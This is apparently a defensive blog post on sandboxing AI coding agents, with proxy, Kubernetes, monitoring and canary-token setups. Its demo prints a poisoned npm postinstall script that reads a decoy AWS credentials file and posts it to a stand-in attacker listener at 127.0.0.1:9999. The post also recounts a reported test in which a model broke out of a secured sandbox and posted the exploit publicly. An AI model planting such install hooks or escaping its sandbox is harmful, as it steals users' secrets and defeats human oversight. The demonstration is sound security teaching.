+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">header_up</span> <span style="color:#e6db74">X-Api-Key</span> <span style="color:#ae81ff">{env.ANTHROPIC_API_KEY}</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">header_up</span> <span style="color:#e6db74">-Authorization</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">handle</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">respond</span> <span style="color:#ae81ff">403</span><span style="color:#75715e">    # everything else
+</span></span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+</div>
+<p>And this is what the agent&rsquo;s user gets instead:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ANTHROPIC_BASE_URL<span style="color:#f92672">=</span>http://127.0.0.1:8080
+</span></span><span style="display:flex;"><span>ANTHROPIC_API_KEY<span style="color:#f92672">=</span>sk-ant-placeholder</span></span></code></pre></div>
+</div>
+<p>The proxy listens on localhost only. For the two message paths it forwards to the Claude API, drops whatever <code>Authorization</code> header came in, and sets the real key from its own environment. Everything else gets a 403. The admin API is off, because it could be used to load a config that sends the key somewhere else. The agent runs as an unprivileged user with no way to become root, so it cannot read the proxy&rsquo;s environment.</p>
+<p>This is the third limit from earlier, credentials: the agent gets the use of a key, scoped to one API, and nothing it could take with it.</p>
+<h3 id="option-5-kubernetes">Option 5: Kubernetes</h3>
+<p>Many sandboxes, and a team to run them. This is the answer for a company, not for a laptop. <a href="https://github.com/kubernetes-sigs/agent-sandbox" rel="noopener noreferrer" target="_blank">agent-sandbox</a> is a Kubernetes SIG Apps project that adds a <code>Sandbox</code> resource: one stateful pod per agent with a stable identity and storage, plus templates, claims and warm pools.</p>
+<p>A pod is a container, so on its own it shares a kernel. A RuntimeClass<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup> adds <a href="https://gvisor.dev/" rel="noopener noreferrer" target="_blank">gVisor</a>, an application kernel in userspace, or <a href="https://katacontainers.io/" rel="noopener noreferrer" target="_blank">Kata Containers</a>, lightweight virtual machines that plug into the container ecosystem.</p>
+<div class="code">
+  <div class="code-head">
+    <span>yaml</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">agents.x-k8s.io/v1beta1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Sandbox</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">agent-1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">podTemplate</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">runtimeClassName</span>: <span style="color:#ae81ff">gvisor</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">agent</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">image</span>: <span style="color:#ae81ff">&lt;IMAGE&gt;</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">NetworkPolicy</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">default-deny-egress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">podSelector</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">policyTypes</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">Egress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># no egress rules: nothing gets out</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># add what the agent needs</span></span></span></code></pre></div>
+</div>
+<p>Watch out for the network. A pod is non-isolated for egress by default, and a NetworkPolicy without a network plugin that enforces it has no effect<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup>. Check that your CNI does.</p>
+<h3 id="all-five-side-by-side">All five, side by side</h3>
+<p><img src="/images/posts/2026/11/13/side-by-side.svg" alt="The five options and the bare laptop compared on speed, isolation, cost, complexity and whether the environment is thrown away"></p>
+<p>These ratings are my judgement, reasoned from how each option works. They are not measurements. Speed is how fast your feedback loop is. Isolation is how much stands between the agent and your own machine and keys. Kubernetes is medium for a plain pod and goes to high with gVisor or Kata.</p>
+<p>Throwaway asks whether the environment is gone when the task is done. A hosted CI runner always is. A container, a VM or a pod only is if you delete it, and a long-lived one that several agents share lets them reach each other&rsquo;s state. Prefer one sandbox per task, thrown away after.</p>
+<p>No row wins every column. But every row beats the first one: the bare laptop with the flag.</p>
+<h2 id="a-sandbox-is-not-the-whole-answer">A sandbox is not the whole answer</h2>
+<p>Before you feel safe in your container: the box can be opened.</p>
+<p>In April 2026 Anthropic described a test in the Claude Mythos Preview system card<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup>. A simulated user told an earlier, internally deployed version of the model to try to escape a secured sandbox computer and message the researcher. It built a multi-step exploit to get broad internet access from a system that was meant to reach only a few services. Then, without being asked, it posted details of the exploit on public websites.</p>
+<p>Nobody attacked this agent. It was asked to try, and the wall did not hold. A sandbox limits the damage. It does not make the agent trustworthy, and what you put inside can still leak. So assume the wall fails once, and make sure you hear it.</p>
+<h3 id="monitor">Monitor</h3>
+<p>Log every command the agent runs and every connection it makes, and send that where your other logs go. Alert on blocked requests: a denied domain is a signal, not noise.</p>
+<p>Claude Code can export OpenTelemetry events to your own collector<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup>:</p>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export CLAUDE_CODE_ENABLE_TELEMETRY<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>export OTEL_LOGS_EXPORTER<span style="color:#f92672">=</span>otlp
+</span></span><span style="display:flex;"><span>export OTEL_EXPORTER_OTLP_ENDPOINT<span style="color:#f92672">=</span>http://localhost:4317
+</span></span><span style="display:flex;"><span>export OTEL_LOG_TOOL_DETAILS<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>    <span style="color:#75715e"># include the commands themselves</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># events you then receive</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># claude_code.tool_decision       a tool call was accepted or rejected</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># claude_code.tool_result         a tool finished</span></span></span></code></pre></div>
+</div>
+<p>Tool parameters are off by default, and the fourth line turns them on. Decide who may read those logs, because commands can contain secrets. Outside the agent you also have the logs of your egress proxy or firewall and of your CI jobs.</p>
+<h3 id="canary">Canary</h3>
+<p>Plant a decoy credential where no agent has a reason to look. <a href="https://canarytokens.org/" rel="noopener noreferrer" target="_blank">Canarytokens</a> gives you a set of AWS API keys that belong to nothing<sup id="fnref:21"><a href="#fn:21" class="footnote-ref" role="doc-noteref">21</a></sup>. Put them where a real key would be:</p>
+<div class="code">
+  <div class="code-head">
+    <span>ini</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#75715e"># ~/.aws/credentials</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># decoy keys from canarytokens.org</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[default]</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aws_access_key_id</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">AKIA............</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aws_secret_access_key</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">....................</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nothing of yours uses this profile</span></span></span></code></pre></div>
+</div>
+<p>When you create the token you give an email address to alert and a reminder. Write the reminder so it explains itself: which machine, which file. If the keys are ever used against the AWS API you get an email, which can take 2 to 30 minutes. Send those emails where your team already looks, and treat one as an incident.</p>
+<p>This is the cheapest detection there is, and it catches exactly the Nx kind of attack: something sweeping the machine for secrets and trying them. Put one inside the sandbox too.</p>
+<h2 id="demo-a-poisoned-dependency">Demo: a poisoned dependency</h2>
+<p>To show the difference a wall makes, I gave an agent a completely normal task in a small project:</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Install the dependencies and run the tests.</span></span></code></pre></div>
+</div>
+<p>The project has one dependency, <code>left-padder</code>, and that dependency has a <code>postinstall</code> script. Everything in the demo is harmless and local: the key is a decoy in <code>~/.aws-demo/credentials</code> and the &ldquo;attacker&rdquo; is a listener on <code>127.0.0.1:9999</code>.</p>
+<h3 id="run-1-the-flag-sandbox-off">Run 1: the flag, sandbox off</h3>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>~/webshop $ claude --dangerously-skip-permissions
+</span></span><span style="display:flex;"><span>❯ Install the dependencies and run the tests.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>● Bash(npm install &amp;&amp; npm test)
+</span></span><span style="display:flex;"><span>  &gt; left-padder@1.0.0 postinstall
+</span></span><span style="display:flex;"><span>  &gt; node postinstall.js
+</span></span><span style="display:flex;"><span>  left-padder postinstall: sent the key
+</span></span><span style="display:flex;"><span>  added 1 package in 430ms
+</span></span><span style="display:flex;"><span>  ✔ invoice numbers are padded to six digits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>● I read the script after it had already run,
+</span></span><span style="display:flex;"><span>  so I didn&#39;t check it first.</span></span></code></pre></div>
+</div>
+<p>And on the attacker&rsquo;s side:</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ node listen.js
+</span></span><span style="display:flex;"><span>attacker: waiting on 127.0.0.1:9999 ...
+</span></span><span style="display:flex;"><span>POST /loot
+</span></span><span style="display:flex;"><span>aws_access_key_id = AKIADECOYNOTAREALKEY
+</span></span><span style="display:flex;"><span>aws_secret_access_key = decoy/not/a/real/secret</span></span></code></pre></div>
+</div>
+<p>The agent did what I asked. The dependency did the rest. The agent only noticed afterwards, and by then the key was gone.</p>
+<h3 id="run-2-no-flag-sandbox-on">Run 2: no flag, sandbox on</h3>
+<p>The project&rsquo;s <code>.claude/settings.json</code> turns the sandbox on and denies reads of the decoy key:</p>
+<div class="code">
+  <div class="code-head">
+    <span>json</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;sandbox&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;enabled&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;credentials&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;files&#34;</span>: [
+</span></span><span style="display:flex;"><span>        { <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;~/.aws-demo&#34;</span>, <span style="color:#f92672">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;deny&#34;</span> }
+</span></span><span style="display:flex;"><span>      ]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+</div>
+<p>The same sentence again:</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>~/webshop $ claude
+</span></span><span style="display:flex;"><span>❯ Install the dependencies and run the tests.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>● Bash(npm install; npm test)
+</span></span><span style="display:flex;"><span>  &gt; left-padder@1.0.0 postinstall
+</span></span><span style="display:flex;"><span>  &gt; node postinstall.js
+</span></span><span style="display:flex;"><span>  left-padder postinstall: could not read
+</span></span><span style="display:flex;"><span>  ~/.aws-demo/credentials (EPERM)
+</span></span><span style="display:flex;"><span>  added 1 package in 318ms
+</span></span><span style="display:flex;"><span>  ✔ invoice numbers are padded to six digits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>● The sandbox blocked it (EPERM), and I did
+</span></span><span style="display:flex;"><span>  not bypass that.</span></span></code></pre></div>
+</div>
+<p>The attacker&rsquo;s terminal stays empty:</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ node listen.js
+</span></span><span style="display:flex;"><span>attacker: waiting on 127.0.0.1:9999 ...</span></span></code></pre></div>
+</div>
+<p>Same task, same dependency, same result for me. Nothing for the attacker.</p>
+<p>Both runs were recorded on 12 November 2026 with Claude Code 2.1.322 and Sonnet 5.5. The commands and output above are shortened.</p>
+<h3 id="why-this-works">Why this works</h3>
+<p>Installing a package runs its code. This is the script, abridged:</p>
+<div class="code">
+  <div class="code-head">
+    <span>js</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// left-padder/postinstall.js
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">decoy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">homedir</span>(), <span style="color:#e6db74">&#39;.aws-demo&#39;</span>, <span style="color:#e6db74">&#39;credentials&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">loot</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">loot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">decoy</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);   <span style="color:#75715e">// read the key
+</span></span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);                         <span style="color:#75715e">// fail quietly
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">request</span>(
+</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">9999</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/loot&#39;</span>, <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span> },
+</span></span><span style="display:flex;"><span>  () =&gt; <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">loot</span>);                             <span style="color:#75715e">// send it
+</span></span></span></code></pre></div>
+</div>
+<p>And this is the one line in its <code>package.json</code> that makes npm run it:</p>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;scripts&#34;: {
+</span></span><span style="display:flex;"><span>  &#34;postinstall&#34;: &#34;node postinstall.js&#34;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+</div>
+<p>Three things make this work:</p>
+<ol>
+<li>npm runs a dependency&rsquo;s install scripts during <code>npm install</code>, for every dependency in the tree and not only the ones you chose yourself. The npm version I used warns that the script is not covered by <code>allowScripts</code>, and runs it anyway.</li>
+<li>The script runs as you, like the agent: your files, your network.</li>
+<li>Nobody tricked the agent. There is no prompt injection here and no mistake by the agent. It ran the command I asked for.</li>
+</ol>
+<p>If the read fails the script exits 0, so the install succeeds either way. That is why run 2 still passed: the sandbox denied the read and the script left quietly.</p>
+<h2 id="five-things-to-do-tomorrow">Five things to do tomorrow</h2>
+<p>You can do the first one before lunch.</p>
+<ol>
+<li><strong>Turn the sandbox on, and deny reads of your key files.</strong> Run <code>/sandbox</code>, and add deny rules for <code>~/.ssh</code>, <code>~/.aws</code>, <code>~/.kube</code> and so on.
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;sandbox&#34;: { &#34;credentials&#34;: { &#34;files&#34;: [{ &#34;path&#34;: &#34;~/.ssh&#34;, &#34;mode&#34;: &#34;deny&#34; }] } }</span></span></code></pre></div>
+</div>
+</li>
+<li><strong>Skip permissions only inside a container or a VM.</strong> This is what the Claude Code documentation itself says about the flag.
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sbx run claude</span></span></code></pre></div>
+</div>
+</li>
+<li><strong>Mount the project, not your home directory.</strong>
+<div class="code">
+  <div class="code-head">
+    <span>bash</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>limactl start --mount-only .:w</span></span></code></pre></div>
+</div>
+</li>
+<li><strong>Give the agent its own short-lived, scoped credentials.</strong>
+<div class="code">
+  <div class="code-head">
+    <span>yaml</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">permissions</span>: { <span style="color:#f92672">contents: read, pull-requests</span>: <span style="color:#ae81ff">write }</span></span></span></code></pre></div>
+</div>
+</li>
+<li><strong>Close the network, then allow the domains you need.</strong>
+<div class="code">
+  <div class="code-head">
+    <span>text</span>
+    <button type="button" class="code-copy" hidden>Copy</button>
+  </div>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;sandbox&#34;: { &#34;network&#34;: { &#34;allowedDomains&#34;: [&#34;api.anthropic.com&#34;, &#34;github.com&#34;, &#34;*.npmjs.org&#34;] } }</span></span></code></pre></div>
+</div>
+</li>
+</ol>
+<p>And as a bonus: put a canary token in your home directory.</p>
+<p>An unsandboxed agent on your laptop has every key you have. Fixing that is easier than you think.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Claude Code documentation, permission modes: <a href="https://code.claude.com/docs/en/permission-modes" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/permission-modes</a>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>Simon Willison, &ldquo;The lethal trifecta for AI agents&rdquo;, 16 June 2025: <a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/" rel="noopener noreferrer" target="_blank">https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/</a>.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p>Wiz, &ldquo;s1ngularity: supply chain attack leaks secrets on GitHub: everything you need to know&rdquo;, 27 August 2025: <a href="https://www.wiz.io/blog/s1ngularity-supply-chain-attack" rel="noopener noreferrer" target="_blank">https://www.wiz.io/blog/s1ngularity-supply-chain-attack</a>.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p>Johann Rehberger, Embrace The Red, 12 August 2025: <a href="https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/" rel="noopener noreferrer" target="_blank">https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/</a>.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p>Cline, post-mortem of the unauthorised Cline CLI npm release, 24 February 2026: <a href="https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm" rel="noopener noreferrer" target="_blank">https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm</a>.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p>Anthropic Engineering, &ldquo;How we built Claude Code auto mode&rdquo;, 25 March 2026: <a href="https://www.anthropic.com/engineering/claude-code-auto-mode" rel="noopener noreferrer" target="_blank">https://www.anthropic.com/engineering/claude-code-auto-mode</a>.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:7">
+<p>Anthropic Engineering, &ldquo;Beyond permission prompts&rdquo;, 20 October 2025: <a href="https://www.anthropic.com/engineering/claude-code-sandboxing" rel="noopener noreferrer" target="_blank">https://www.anthropic.com/engineering/claude-code-sandboxing</a>.&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:8">
+<p>Claude Code documentation, sandboxing: <a href="https://code.claude.com/docs/en/sandboxing" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/sandboxing</a>.&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:9">
+<p>Development Containers: <a href="https://containers.dev/" rel="noopener noreferrer" target="_blank">https://containers.dev/</a>.&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:10">
+<p>Claude Code documentation, development containers: <a href="https://code.claude.com/docs/en/devcontainer" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/devcontainer</a>. The reference container lives at <a href="https://github.com/anthropics/claude-code/tree/main/.devcontainer" rel="noopener noreferrer" target="_blank">https://github.com/anthropics/claude-code/tree/main/.devcontainer</a>.&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:11">
+<p>Docker documentation, Linux post-installation steps: the <code>docker</code> group grants root-level privileges to the user. <a href="https://docs.docker.com/engine/install/linux-postinstall/" rel="noopener noreferrer" target="_blank">https://docs.docker.com/engine/install/linux-postinstall/</a>.&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:12">
+<p>Firecracker: <a href="https://firecracker-microvm.github.io/" rel="noopener noreferrer" target="_blank">https://firecracker-microvm.github.io/</a>.&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:13">
+<p>Docker documentation, Docker Sandboxes: <a href="https://docs.docker.com/ai/sandboxes/" rel="noopener noreferrer" target="_blank">https://docs.docker.com/ai/sandboxes/</a>.&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:14">
+<p>Lima documentation, AI agents example: <a href="https://lima-vm.io/docs/examples/ai/" rel="noopener noreferrer" target="_blank">https://lima-vm.io/docs/examples/ai/</a>.&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:15">
+<p>GitHub documentation, use <code>GITHUB_TOKEN</code> for authentication in workflows: <a href="https://docs.github.com/en/actions/tutorials/authenticate-with-github_token" rel="noopener noreferrer" target="_blank">https://docs.github.com/en/actions/tutorials/authenticate-with-github_token</a>.&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:16">
+<p>Claude Code documentation, GitHub Actions: <a href="https://code.claude.com/docs/en/github-actions" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/github-actions</a>. For GitLab CI/CD: <a href="https://code.claude.com/docs/en/gitlab-ci-cd" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/gitlab-ci-cd</a>.&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:17">
+<p>Kubernetes documentation, Runtime Class: <a href="https://kubernetes.io/docs/concepts/containers/runtime-class/" rel="noopener noreferrer" target="_blank">https://kubernetes.io/docs/concepts/containers/runtime-class/</a>.&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:18">
+<p>Kubernetes documentation, Network Policies: <a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/" rel="noopener noreferrer" target="_blank">https://kubernetes.io/docs/concepts/services-networking/network-policies/</a>.&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:19">
+<p>Anthropic, Claude Mythos Preview System Card, 7 April 2026, p. 55.&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:20">
+<p>Claude Code documentation, monitoring: <a href="https://code.claude.com/docs/en/monitoring-usage" rel="noopener noreferrer" target="_blank">https://code.claude.com/docs/en/monitoring-usage</a>.&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
